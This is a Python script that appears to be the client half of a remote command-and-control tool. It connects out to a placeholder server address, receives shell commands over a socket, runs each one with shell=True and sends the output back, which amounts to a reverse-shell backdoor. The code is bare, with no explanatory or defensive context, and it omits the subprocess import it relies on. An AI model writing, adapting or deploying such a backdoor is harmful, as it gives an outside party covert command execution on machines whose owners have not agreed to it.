import socket
import os

SERVER_IP = "SERVER IP ADDRESS"
SERVER_PORT = 12345 #Same port as specified in the server

def execute_command(command):
    try:
        if os.name == 'nt':
            # Windows-specific handling
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output, error_output = process.communicate()
            output = output.decode("utf-8")
            error_output = error_output.decode("utf-8")
        else:
            # Linux handling
            process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output = process.stdout.decode("utf-8")
            error_output = process.stderr.decode("utf-8")

        if output:
            return output.strip()
        elif error_output:
            return error_output.strip()
        else:
            return "Command executed successfully with no output."
    except Exception as e:
        return str(e)

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.bind(("", 0))  # Let the system assign a random available port
    client_socket.connect((SERVER_IP, SERVER_PORT))

    # Get the client IP address and port for identification
    client_ip = socket.gethostbyname(socket.gethostname())
    client_port = client_socket.getsockname()[1]

    # Send the client's assigned port to the server for identification
    client_socket.sendall(f"{client_port}".encode())

    print(f"Connected to server. Client IP: {client_ip}, Client port: {client_port}")

    try:
        while True:
            # Receive the assigned port and target name from the server
            data = client_socket.recv(4096).decode()
            if not data:
                break

            if data.lower() == "exit":
                break

            # Terminate the loop if the server sends the termination signal
            if ":" in data:
                target_name, target_port = data.split(":")
                target_name = target_name.strip().lower()
                target_port = int(target_port.strip())

                print(f"Received assigned port {target_port} for target '{target_name}'")

                # Connect to the target machine using the assigned port
                target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                target_socket.connect((SERVER_IP, target_port))

                # Process commands from the server (optional, you can remove this part if not needed)
                while True:
                    # Receive commands from the server
                    command = target_socket.recv(4096).decode()
                    if not command:
                        break

                    if command.lower() == "exit":
                        break

                    print(f"Received command '{command}' from the server for target '{target_name}'")

                    # Execute the command and get the result
                    result = execute_command(command)

                    # Send the result back to the server
                    target_socket.sendall(result.encode())

                # Close the connection to the target machine
                target_socket.close()

    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

if __name__ == "__main__":
    main()
